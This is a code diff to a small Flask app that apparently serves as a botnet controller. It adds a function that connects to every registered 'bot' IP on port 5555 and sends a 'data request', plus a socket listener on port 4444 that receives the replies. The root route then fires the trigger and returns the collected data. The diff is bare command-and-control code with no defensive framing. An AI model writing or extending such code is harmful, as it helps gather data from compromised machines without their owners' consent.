@@ -1,10 +1,30 @@
 # /usr/share/python3 
 
 from flask import Flask, request
+import socket
 
 app = Flask(__name__)
 
 bot_dict = {}
+
+system_ip = '192.168.242.93'
+
+def listner(system_ip, system_port):
+    listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        
+    listner.bind((system_ip, system_port))                                     
+    listner.listen(0)                                                    
+    connection, address = listner.accept()                        
+    recieved_data = connection.recv(1024 * 100)
+    return recieved_data.decode()
+
+def trigger():
+    bot_names = bot_dict.keys()
+    for bot in bot_names:
+        bot_ip = bot_dict[bot]
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((bot_ip, 5555))
+        sock.sendall(bytes("data request",encoding="utf-8"))
 
 @app.route('/register_bot')
 def register_bot():
@@ -15,4 +35,6 @@ def register_bot():
     
 @app.route('/')
 def test():
-    return bot_dict
+    trigger()
+    data = listner(system_ip, 4444)
+    return data
